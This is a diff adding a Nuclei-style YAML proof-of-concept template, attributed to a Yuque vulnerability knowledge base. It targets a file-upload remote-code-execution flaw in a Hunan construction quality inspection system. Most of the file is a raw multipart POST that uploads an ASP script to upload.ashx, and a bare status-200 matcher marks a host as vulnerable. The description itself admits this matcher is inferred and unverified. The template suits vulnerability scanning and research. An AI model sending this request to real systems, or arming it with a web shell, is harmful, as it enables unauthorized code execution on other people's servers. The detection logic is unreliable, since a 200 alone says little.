@@ -1,0 +1,42 @@
+id: poc-ginxg9b534uy1c34
+info:
+  name: 湖南建研信息工程质量检测系统 文件上传致RCE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ginxg9b534uy1c34
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ginxg9b534uy1c34
+http:
+- raw:
+  - 'POST /Applications/Attachment/upload.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4
+
+    Connection: close
+
+    --------------------------8ecd2b831e8d20f4
+
+    Content-Disposition: form-data; name="file"; filename="asd.txt"
+
+    <% Response.Write("Hello, World") %>
+
+    --------------------------8ecd2b831e8d20f4
+
+    Content-Disposition: form-data; name="_upload_guid"
+
+    asd
+
+    --------------------------8ecd2b831e8d20f4--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
